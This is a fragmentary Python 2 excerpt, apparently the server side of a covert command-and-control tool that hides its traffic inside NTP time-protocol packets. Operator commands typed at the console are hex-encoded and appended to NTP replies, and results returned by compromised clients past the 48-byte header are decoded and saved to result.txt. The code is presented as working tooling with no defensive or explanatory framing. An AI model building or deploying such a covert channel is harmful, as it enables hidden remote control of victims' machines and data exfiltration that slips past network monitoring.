...
class NTPPacket:
    ...
    _PACKET_FORMAT = "!4B 11I"
    _PACKET_Rec_FORMAT = "!4B 11I"
    ...
    def from_data(self, data):
        ...
        """
        _PACKET_Rec_FORMAT = "!B B B b 11I"
        try:
            unpacked = struct.unpack(NTPPacket._PACKET_Rec_FORMAT,
                    data[0:struct.calcsize(NTPPacket._PACKET_Rec_FORMAT)])
        except struct.error as e:
            print(e)
        ...
        while True:
            ...
            if len(rlist) != 0:
                ...
                for tempSocket in rlist:
                    try:
                        data,addr = tempSocket.recvfrom(102400)
    ...
    def run(self):
        ...
        while True:
            ...
            try:
                ...
                try:
                    callback = binascii.a2b_hex(data[48:])
                except:
                    callback = ""
                if callback != "":
                    filename = './result.txt'
                    with open(filename, 'a') as file_object:
                        file_object.write(callback)
                        file_object.flush()
                    # print(getresult())  # type result
                ...
                try:
                    ...
                    socket.sendto(sendPacket.to_data() + getcommand(),addr)
...
def getcommand():
    text_path = './command.txt'
    f = open(text_path, 'r')
    command = f.read()
    with open(text_path, 'w') as f1:
        f1.seek(0)
        f1.truncate()
    return binascii.b2a_hex(command)

def cleanall():
    with open('./command.txt', 'w') as f1:
        f1.seek(0)
        f1.truncate()
...
class CommandThread(threading.Thread):
    ...
    def run(self):
        ...
        while True:
            if stopFlag == True:
                print "CommandThread Ended"
                break
            try:
                c = raw_input("")
                # print(type(c))
                if len(c) <=256:
                    writecommand(c)  # type command
                else:
                    print("Command too long! Over 256!")
            except:
                pass
